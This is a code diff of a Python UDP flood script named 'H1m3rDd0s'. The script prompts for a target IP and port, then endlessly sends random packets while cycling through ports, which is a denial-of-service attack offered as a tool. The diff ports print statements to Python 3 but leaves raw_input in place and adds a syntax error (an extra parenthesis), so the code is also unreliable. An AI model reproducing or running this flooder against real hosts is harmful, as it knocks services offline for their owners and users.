@@ -19,32 +19,38 @@ bytes = random._urandom(1490)                                #NO CHANGES IN THE 
 
 os.system("clear")
 os.system("figlet H1m3rDd0s")
-print
-print "Author  : Sn8ow"
-print "github  : https://github.com/Sn8ow"
-print "PayPal  : https://paypal.me/Sn8ow"
-print
+print("")
+print ("Author  : Sn8ow")
+print ("github  : https://github.com/Sn8ow")
+print ("PayPal  : https://paypal.me/Sn8ow")
+print("")
+
 ip = raw_input("IP Target : ")
+
 port = input("Port (Default 80): ")
 
+if port == "" :
+     port=80
+     
+#nice one 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("Sent ",sent," packet to ",ip, " throught port: ",port))
      if port == 65534:
        port = 1
 
